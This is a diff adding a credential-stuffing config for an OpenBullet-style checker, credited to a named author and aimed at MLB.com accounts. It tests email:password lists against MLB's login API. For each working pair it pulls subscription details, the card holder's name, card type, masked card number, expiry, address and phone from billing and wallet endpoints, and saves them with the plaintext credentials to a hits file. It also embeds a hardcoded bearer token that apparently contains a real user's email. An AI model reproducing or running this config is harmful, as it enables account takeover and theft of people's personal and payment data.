@@ -1,0 +1,153 @@
+[SETTINGS]
+{
+  "Name": "MLB.com (Proxyless)",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-08T21:19:07.4230182+04:00",
+  "AdditionalInfo": "Full Capture | Move Free TO Custom",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://ids.mlb.com/api/v1/authn" 
+  CONTENT "{\"password\":\"<PASS>\",\"username\":\"<USER>\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":false}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: ids.mlb.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: en" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.mlb.com/" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-Okta-User-Agent-Extended: okta-signin-widget-5.9.4" 
+  HEADER "Origin: https://www.mlb.com" 
+  HEADER "Content-Length: 138" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Authentication failed" 
+  KEYCHAIN Success OR 
+    KEY "SUCCESS" 
+
+#sTOK PARSE "<SOURCE>" JSON "sessionToken" -> VAR "sTOK" 
+
+#uid PARSE "<SOURCE>" LR "{\"id\":\"" "\"" -> VAR "uid" 
+
+#GET_PLAN REQUEST GET "https://mlbbillingservices.mlb.com/customers/<uid>/subscriptions" 
+  
+  HEADER "Host: mlbbillingservices.mlb.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"92\", \"Opera\";v=\"78\"" 
+  HEADER "Authorization: Bearer eyJraWQiOiJiRGg5Yjlyck0yUWlRSjl5TDJWQzJIQjBCWUYxYl8wX3dicVZWNzZEVmhvIiwiYWxnIjoiUlMyNTYifQ.eyJ2ZXIiOjEsImp0aSI6IkFULjhoRmRxaEt0WHJlaTlyTzE2Snp3emEzWU1xNFVUMENGTnNsQ19pZnNidHMiLCJpc3MiOiJodHRwczovL2lkcy5tbGIuY29tL29hdXRoMi9hdXMxbTA4OHlLMDdub0JmaDM1NiIsImF1ZCI6ImFwaTovL21sYl9kZWZhdWx0IiwiaWF0IjoxNjMwOTc5ODE4LCJleHAiOjE2MzEwNjYyMTgsImNpZCI6IjBvYXA3d2E4NTdqY3ZQbFo1MzU1IiwidWlkIjoiMDB1OGxoY2EzOTU1aFNWcWQzNTciLCJzY3AiOlsiZW1haWwiLCJvcGVuaWQiXSwic3ViIjoiY2FybG9zamNzNDEyQGdtYWlsLmNvbSIsImlwaWQiOiIiLCJtbGJfZW50aXRsZW1lbnQiOnRydWUsImd1aWQiOiIifQ.L2mZzu8uLsHfmdOFjdu8o06p00iyvMv4ottID_qiz_0pCsEC9Aqg4lAKWAhsl5ao02xFqR_bgESxr0nu6AnJj5ecRcGC5jpz7DZDlfV9Ku5y_Le0Li4oaIF-tmXftBJQZ1KvRpgAt8a5TkhTB1PAtqWfJDjI4nlINC1bgLyY68X7DSqrqpiFk1Ha3nCiUgATyWBYNYfTjcDQIj9B0rW-T-bl7mqhxaX532oOo0zgHkssdjLBrxTbHNMmRVSwcgAyYwuDAaSg15QMCAJK5rHT07qwVSEFsH8F-6bqAtEEN-TCcJKGOwZfy1ldIEM5qMeWHYbYwFr4wLA5yAJA_SV5Dw" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 OPR/78.0.4093.184" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.mlb.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.mlb.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#sub1 PARSE "<SOURCE>" JSON "subscriptionStatus" -> VAR "sub1" 
+
+#sub2 PARSE "<SOURCE>" JSON "itemName" -> VAR "sub2" 
+
+#cur PARSE "<SOURCE>" JSON "currencyCode" -> VAR "cur" 
+
+#sub3 PARSE "<SOURCE>" JSON "itemUnitPrice" -> VAR "sub3" "" " <cur>" 
+
+#sub4 PARSE "<SOURCE>" JSON "billingFrequency" -> VAR "sub4" 
+
+#GET_BANKS REQUEST GET "https://mlbpaymentservices.mlb.com/wallet/<uid>/accounts" 
+  
+  HEADER "Host: mlbpaymentservices.mlb.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"92\", \"Opera\";v=\"78\"" 
+  HEADER "Authorization: Bearer eyJraWQiOiJiRGg5Yjlyck0yUWlRSjl5TDJWQzJIQjBCWUYxYl8wX3dicVZWNzZEVmhvIiwiYWxnIjoiUlMyNTYifQ.eyJ2ZXIiOjEsImp0aSI6IkFULjhoRmRxaEt0WHJlaTlyTzE2Snp3emEzWU1xNFVUMENGTnNsQ19pZnNidHMiLCJpc3MiOiJodHRwczovL2lkcy5tbGIuY29tL29hdXRoMi9hdXMxbTA4OHlLMDdub0JmaDM1NiIsImF1ZCI6ImFwaTovL21sYl9kZWZhdWx0IiwiaWF0IjoxNjMwOTc5ODE4LCJleHAiOjE2MzEwNjYyMTgsImNpZCI6IjBvYXA3d2E4NTdqY3ZQbFo1MzU1IiwidWlkIjoiMDB1OGxoY2EzOTU1aFNWcWQzNTciLCJzY3AiOlsiZW1haWwiLCJvcGVuaWQiXSwic3ViIjoiY2FybG9zamNzNDEyQGdtYWlsLmNvbSIsImlwaWQiOiIiLCJtbGJfZW50aXRsZW1lbnQiOnRydWUsImd1aWQiOiIifQ.L2mZzu8uLsHfmdOFjdu8o06p00iyvMv4ottID_qiz_0pCsEC9Aqg4lAKWAhsl5ao02xFqR_bgESxr0nu6AnJj5ecRcGC5jpz7DZDlfV9Ku5y_Le0Li4oaIF-tmXftBJQZ1KvRpgAt8a5TkhTB1PAtqWfJDjI4nlINC1bgLyY68X7DSqrqpiFk1Ha3nCiUgATyWBYNYfTjcDQIj9B0rW-T-bl7mqhxaX532oOo0zgHkssdjLBrxTbHNMmRVSwcgAyYwuDAaSg15QMCAJK5rHT07qwVSEFsH8F-6bqAtEEN-TCcJKGOwZfy1ldIEM5qMeWHYbYwFr4wLA5yAJA_SV5Dw" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 OPR/78.0.4093.184" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.mlb.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.mlb.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#A4 PARSE "<SOURCE>" JSON "accountType" -> VAR "A4" 
+
+#A1 PARSE "<SOURCE>" JSON "nameOnAccount" -> VAR "A1" 
+
+#A2 PARSE "<SOURCE>" JSON "cardType" -> VAR "A2" 
+
+#A3 PARSE "<SOURCE>" JSON "maskedAccountNumber" -> VAR "A3" 
+
+#M PARSE "<SOURCE>" JSON "expirationMonth" -> VAR "M" 
+
+#exp PARSE "<SOURCE>" JSON "expirationYear" -> VAR "exp" 
+
+#Addy PARSE "<SOURCE>" JSON "addressLine1" -> VAR "Addy" 
+
+#ci PARSE "<SOURCE>" JSON "city" -> VAR "ci" 
+
+#st PARSE "<SOURCE>" JSON "state" -> VAR "st" 
+
+#zip PARSE "<SOURCE>" JSON "postalCode" -> VAR "zip" 
+
+#cou PARSE "<SOURCE>" JSON "country" -> VAR "cou" 
+
+#pho PARSE "<SOURCE>" JSON "phone" -> VAR "pho" 
+
+#date PARSE "<SOURCE>" LR "\"createdDate\":\"" "T" -> VAR "date" 
+
+#AUTHOR FUNCTION Constant "🔥 YashvirGaming#7131 🔥" -> CAP "Config By" 
+
+#FULL_CAPTURE FUNCTION Constant "Plan Status: <sub1> | Plan: <sub2> | Plan Price: <sub3> | Billing: <sub4> | Address: <Addy>, City: <ci>, State: <st>, Zipcode: <zip>, Country: <cou> | Phone Number: <pho> | Date Registered: <date> | Payment Method: <A4> | Card Holder: <A1> | Card Type: <A2> | Card Number: <A3> | Card Expiry: <M>|<exp> || Config By: <Config By>" -> CAP "FULL CAPTURE" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<sub1>" Contains "INACTIVE" 
+    KEY "<sub1>" Contains "CANCELLED" 
+    KEY "<sub1>" DoesNotContain "ACTIVE" 
+  KEYCHAIN Success OR 
+    KEY "<sub1>" Contains "ACTIVE" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<sub1>" Contains "EXPIRED" 
+
+#SAVE UTILITY File "MBL Hits.txt" AppendLines "┏━━━━━━━━┏━━━━━━━━━━━━━━━┓━━━━━━━┓\\\\n↬ 【 MAJOR BASEBALL LEAGUES ACCOUNTS 】 \\\\n↬ 【 Email : <USER> 】 \\\\n↬ 【 Password : <PASS> 】 \\\\n 【 Plan Status : <sub1> 】 \\\\n↬ 【 Plan : <sub2> 】 \\\\n↬【 Plan Price: <sub3> 】 \\\\n↬ 【 Billing: <sub4> 】 \\\\n↬ 【 Address: <Addy>, City: <ci>, State: <st>, Zipcode: <zip>, Country: <cou> 】 \\\\n↬ 【 Phone Number: <pho> 】 \\\\n↬  【 Date Registered: <date> 】 \\\\n↬  【 Payment Method: <A4> 】 \\\\n↬  【 Card Holder: <A1> 】 \\\\n↬  【 Card Type: <A2> 】 \\\\n↬  【 Card Number: <A3> 】 \\\\n↬  【 Card Expiry: <M>|<exp> 】 \\\\n↬ Config By YashvirGaming#7131 \\\\n┗━━━━━━━┗━━━━━━━━━━━━━━━┛━━━━━━━━┛\\\\n" 
+
